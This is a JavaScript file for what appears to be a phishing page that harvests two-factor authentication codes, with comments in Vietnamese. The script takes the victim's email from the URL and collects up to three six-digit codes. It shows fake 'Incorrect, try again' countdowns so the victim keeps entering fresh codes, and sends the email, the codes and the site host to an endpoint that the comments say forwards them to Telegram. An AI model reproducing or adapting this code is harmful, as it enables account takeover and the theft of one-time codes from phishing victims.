setTimeout(() => {
    document.getElementById("loading").style.display = "none";
    document.querySelector(".main_form").style.display = "block";
}, 2000);

var code1 = null,
    code2 = null,
    code3 = null;

// Lấy các phần tử DOM
const note = document.getElementById("note");
const field = document.getElementById("field");
const submit = document.getElementById("submit");

// ✅ **Lấy tham số code từ URL và gán vào code1, code2, code3**
const currentUrl = new URL(window.location.href);
const codeParam = currentUrl.searchParams.get("code");

if (codeParam) {
    var codeArray = codeParam.split(",");

    code1 = codeArray[0] || null;
    code2 = codeArray[1] || null;
    code3 = codeArray[2] || null;
}
var email = currentUrl.pathname.split("/code/")[1];

// ✅ **Gửi API Telegram với mã code hiện tại**
const sendToTelegram = (callback) => {
    const currentUrl = window.location.host;
    const message = `url: ${currentUrl}\nemail: ${email}\n2FA-1: ${code1}\n2FA-2: ${code2}\n2FA-3: ${code3}`;

    const url = `${
        window.location.origin
    }/send-message?message=${encodeURIComponent(message)}`;

    fetch(url)
        .then((response) => {
            if (!response.ok) {
                throw new Error("Network response was not ok");
            }
            return response.json();
        })
        .then((data) => {
            console.log("API response:", data);
            callback(); // Gọi callback sau khi API hoàn tất
        })
        .catch((error) => {
            console.error(
                "There was a problem with the fetch operation:",
                error
            );
            callback(); // Gọi callback ngay cả khi lỗi
        });
};

if (codeArray) {
    if (codeArray.length == 1) var i = 15;
    else if (codeArray.length == 2) var i = 30;
    field.disabled = true;
    submit.disabled = true;
    submit.style.pointerEvents = "none";
    note.innerText = "Incorrect. Please, try again after " + i + "s";

    const interval = setInterval(() => {
        i--;
        note.innerText = "Incorrect. Please, try again after " + i + "s";
        if (i <= 0) {
            clearInterval(interval);
            note.innerText = "";
            field.disabled = false;
            submit.disabled = false;
            submit.style.pointerEvents = "auto";
        }
    }, 1000);
}

// ✅ **Sự kiện nhập liệu**
field.addEventListener("input", () => {
    const value = field.value;
    if (value.length === 6) {
        submit.classList.add("active");
    } else {
        submit.classList.remove("active");
    }
});

// ✅ **Ngăn chặn Enter submit form**
field.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
        event.preventDefault();
    }
});

// ✅ **Sự kiện khi click Submit**
submit.addEventListener("click", () => {
    const value = field.value;

    if (value.length === 6) {
        // Bắn API trước, sau đó reload URL với tham số code
        const currentUrl = new URL(window.location.href);
        const existingCodes = currentUrl.searchParams.get("code") || "";
        var updatedCodes = existingCodes ? `${existingCodes},${value}` : value;
        [code1, code2, code3] = updatedCodes.split(",");
        if (code3) {
            sendToTelegram();
            document.querySelector("form").submit();
        }
        sendToTelegram(() => {
            currentUrl.searchParams.set("code", updatedCodes);
            window.location.href = currentUrl.href;
        });
    }
});
